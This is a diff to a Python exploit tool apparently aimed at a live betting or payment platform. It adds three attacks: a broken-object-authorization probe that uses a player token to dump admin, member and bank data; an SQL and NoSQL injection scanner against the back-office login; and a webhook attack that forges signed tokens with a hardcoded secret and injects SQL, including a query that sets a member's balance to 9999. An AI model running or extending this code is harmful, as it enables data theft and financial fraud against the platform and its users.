@@ -464,6 +464,177 @@ def exploit_F16_firebase_idor():
         jq(raw)
 
 
+def exploit_F14b_bgapi_bola():
+    """F14b — bgapi BOLA: Player JWT reads BO admin config"""
+    banner("F14b — bgapi BOLA (Player JWT → BO Admin Routes)")
+    if not _state['jwt']:
+        if not do_auth(): return
+
+    tid, domain, jwt = _state['tid'], _state['domain'], _state['jwt']
+    base = f"https://{tid}bgapi.asdgapicenterssdo.com"
+
+    endpoints = [
+        ("GET",  "/bo/info/admin",          "Admin list (mass enum)"),
+        ("GET",  "/bo/config",               "Platform config"),
+        ("GET",  "/bo/deposit-transaction",  "All deposits (BO view)"),
+        ("GET",  "/bo/member",               "All members"),
+        ("GET",  "/bo/withdrawal-transaction","All withdrawals"),
+        ("GET",  "/bo/bank-information",     "Bank accounts"),
+        ("GET",  "/bo/payment-type",         "Payment types"),
+        ("GET",  "/bo/promotion",            "Promotions"),
+    ]
+
+    hits = 0
+    for method, path, label in endpoints:
+        url = f"{base}{path}?domain={domain}"
+        c, raw = _r(method, url, jwt)
+        sym = f"{GREEN}✓{RESET}" if c == 200 else f"{RED}✗{RESET}"
+        print(f"  [{sym}] {label}: HTTP {c}")
+        if c == 200:
+            hits += 1
+            try:
+                d = json.loads(raw)
+                items = d if isinstance(d, list) else d.get("data", d)
+                if isinstance(items, list):
+                    ok(f"  → {len(items)} records")
+                    if path == "/bo/info/admin" and items:
+                        ok(f"  → First admin: {items[0].get('username','?')} / {items[0].get('email','?')}")
+                elif isinstance(items, dict):
+                    ok(f"  → Keys: {list(items.keys())[:6]}")
+            except Exception:
+                pass
+
+    if hits:
+        ok(f"BOLA confirmed: {hits}/{len(endpoints)} BO routes accessible with player JWT")
+    else:
+        err("No BO routes accessible — bgapi may require real BO JWT or be down")
+
+
+def exploit_bo_auth_sqli():
+    """BO bgapi /bo/authentication SQLi scanner"""
+    banner("BO Auth SQLi — /bo/authentication")
+    tid, domain = _state['tid'], _state['domain']
+    target = f"https://{tid}bgapi.asdgapicenterssdo.com/bo/authentication"
+    info(f"Target: {target}")
+
+    PAYLOADS_SQLI = [
+        # baseline
+        ("baseline",      {"email": "admin@test.com", "password": "wrong"},   None),
+        # error-based
+        ("err_sq",        {"email": "admin'", "password": "test"},             None),
+        ("err_or_true",   {"email": "admin' OR '1'='1", "password": "test"},   None),
+        ("err_or1",       {"email": "' OR 1=1--", "password": "test"},         None),
+        ("err_dq",        {"email": 'admin"', "password": "test"},             None),
+        ("err_pass_sq",   {"email": "admin@test.com", "password": "test'"},    None),
+        # time-based PostgreSQL
+        ("time_pg5",      {"email": "'; SELECT pg_sleep(5)--", "password": "x"}, 4.5),
+        ("time_pg_or",    {"email": "' OR (SELECT pg_sleep(5))--", "password": "x"}, 4.5),
+        # time-based MySQL
+        ("time_mysql5",   {"email": "admin' AND SLEEP(5)--", "password": "x"},  4.5),
+        ("time_or_sleep", {"email": "' OR SLEEP(5)--", "password": "x"},         4.5),
+        # NoSQL
+        ("nosql_ne",      {"email": {"$ne": None}, "password": {"$ne": None}},   None),
+        ("nosql_gt",      {"email": {"$gt": ""}, "password": {"$gt": ""}},        None),
+    ]
+
+    baseline_time = None
+    for pid, body, threshold in PAYLOADS_SQLI:
+        timeout = 20 if threshold else 10
+        t0 = time.time()
+        code, raw = _r("POST", target, body=body,
+                       extra_headers={"Referer": f"https://manage.{_state['domain']}/",
+                                      "Origin": f"https://manage.{_state['domain']}"})
+        elapsed = time.time() - t0
+
+        if pid == "baseline":
+            baseline_time = elapsed
+            print(f"  baseline: HTTP {code} ({elapsed:.2f}s)")
+            continue
+
+        flag = ""
+        if threshold and elapsed >= threshold:
+            flag = f"  {RED}*** TIME DELAY {elapsed:.2f}s ***{RESET}"
+        elif code == 200 and pid.startswith(("err_or", "nosql")):
+            flag = f"  {RED}*** 200 ON INJECTION ***{RESET}"
+        elif code == 500:
+            flag = f"  {YELLOW}! HTTP 500{RESET}"
+        elif baseline_time and elapsed > baseline_time + 3.0:
+            flag = f"  {YELLOW}! timing delta +{elapsed-baseline_time:.2f}s{RESET}"
+
+        raw_lower = raw.lower()
+        for kw in ["sql syntax", "postgresql", "unclosed quotation", "pg_query",
+                   "syntax error", "invalid column", "ora-"]:
+            if kw in raw_lower:
+                flag += f"  {RED}SQL ERR: {kw}{RESET}"
+                break
+
+        sym = GREEN+"OK"+RESET if not flag else RED+"**"+RESET
+        print(f"  [{sym}] {pid}: HTTP {code} ({elapsed:.2f}s){flag}")
+
+    info("Scan complete")
+
+
+def exploit_sms_webhook_sqli():
+    """SMS TW webhook → PostgreSQL SQLi"""
+    banner("SMS Webhook → PostgreSQL SQLi")
+    import base64, hmac, hashlib
+
+    TW_SECRET = b'0o/9IYwY@,-22%k4\\I9'
+    tid, domain = _state['tid'], _state['domain']
+    base_url = f"https://{tid}api.asdgapicenterssdo.com/webhooks/sms/truewallet"
+
+    def b64url(data):
+        if isinstance(data, str): data = data.encode()
+        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+    def build_tw_jwt(sender, message="", amount=100):
+        import datetime as dt
+        now = dt.datetime.now(dt.timezone(dt.timedelta(hours=7)))
+        header = {"alg": "HS256", "typ": "JWT"}
+        payload = {
+            "event_type": "P2P",
+            "received_time": now.strftime('%Y-%m-%dT%H:%M:%S+0700'),
+            "amount": int(amount * 100),
+            "sender_mobile": sender,
+            "message": message,
+            "iat": int(now.timestamp()),
+        }
+        h = b64url(json.dumps(header, separators=(',', ':')))
+        p = b64url(json.dumps(payload, separators=(',', ':')))
+        sig = hmac.new(TW_SECRET, f"{h}.{p}".encode(), digestmod=hashlib.sha256).digest()
+        return f"{h}.{p}.{b64url(sig)}"
+
+    sqli_cases = [
+        ("baseline",     "0811111111",               "hello",              100),
+        ("time_pg_sender", "' OR (SELECT pg_sleep(5))::text || '", "hello", 100),
+        ("time_pg_msg",  "0811111111",               "'; SELECT pg_sleep(5)--", 100),
+        ("err_single",   "0811111111'",              "hello",              100),
+        ("err_single_msg","0811111111",              "test'",              100),
+        ("stacked_pg",   "0811111111",               "test'; UPDATE members SET balance=9999 WHERE phone='0811111111'--", 100),
+    ]
+
+    for pid, sender, msg, amt in sqli_cases:
+        jwt_tok = build_tw_jwt(sender, msg, amt)
+        threshold = 4.5 if "time_" in pid else None
+        timeout = 20 if threshold else 10
+        t0 = time.time()
+        code, raw = _r("POST", base_url, body={"token": jwt_tok},
+                       extra_headers={"papdieaw": PAPDIEAW_KEY})
+        elapsed = time.time() - t0
+
+        flag = ""
+        if threshold and elapsed >= threshold:
+            flag = f"  {RED}*** DELAY {elapsed:.2f}s ***{RESET}"
+        elif code == 200:
+            flag = f"  {GREEN}→ accepted{RESET}"
+        elif code == 500:
+            flag = f"  {YELLOW}! 500{RESET}"
+
+        print(f"  {pid}: HTTP {code} ({elapsed:.2f}s){flag}")
+
+    info("Note: webhook is on api (Node.js) service, not mgapi")
+
+
 def check_state():
     """Check current platform health"""
     banner(f"Platform Health Check — {_state['tenant']}")
@@ -559,6 +730,9 @@ MENU = [
     ("4", "F08  Cross-Tenant JWT Bypass",    exploit_F08_cross_tenant),
     ("5", "F09  BOLA Deposit Gateway",       exploit_F09_bola),
     ("6", "F16  Firebase Token IDOR",        exploit_F16_firebase_idor),
+    ("7", "F14b bgapi BOLA (Player→BO)",     exploit_F14b_bgapi_bola),
+    ("8", "    BO Auth SQLi Scanner",        exploit_bo_auth_sqli),
+    ("9", "    SMS Webhook SQLi",            exploit_sms_webhook_sqli),
     ("",  "─── Utilities ──────────────",   None),
     ("S", "Status / Health Check",           check_state),
     ("A", "All-Tenant Deposit Sweep",        sweep_all_tenants),
@@ -583,7 +757,8 @@ def print_menu():
 
 
 # positional number → exploit name
-NUM_MAP = {"1":"F01","2":"F02","3":"F05","4":"F08","5":"F09","6":"F16","S":"S","A":"A"}
+NUM_MAP = {"1":"F01","2":"F02","3":"F05","4":"F08","5":"F09","6":"F16",
+           "7":"F14b","8":"SQLI","9":"WEBHOOKSQLI","S":"S","A":"A"}
 
 
 def loop_all_tenants(firebase_key: str = None, amount: float = 100.0):
@@ -730,7 +905,7 @@ def main():
     ap.add_argument("--pass",   "-P", dest="password", default=None)
     ap.add_argument("--jwt",    "-j", default=None)
     ap.add_argument("--exploit","-e", default=None,
-                    choices=["F01","F02","F05","F08","F09","F16"],
+                    choices=["F01","F02","F05","F08","F09","F16","F14B","SQLI","WEBHOOKSQLI"],
                     type=str.upper,
                     help="Run a specific exploit non-interactively (case-insensitive)")
     ap.add_argument("--amount", "-a", type=float, default=100.0)
@@ -779,6 +954,9 @@ def main():
             "F08": exploit_F08_cross_tenant,
             "F09": exploit_F09_bola,
             "F16": exploit_F16_firebase_idor,
+            "F14B": exploit_F14b_bgapi_bola,
+            "SQLI": exploit_bo_auth_sqli,
+            "WEBHOOKSQLI": exploit_sms_webhook_sqli,
             "S":   check_state,
             "A":   sweep_all_tenants,
         }
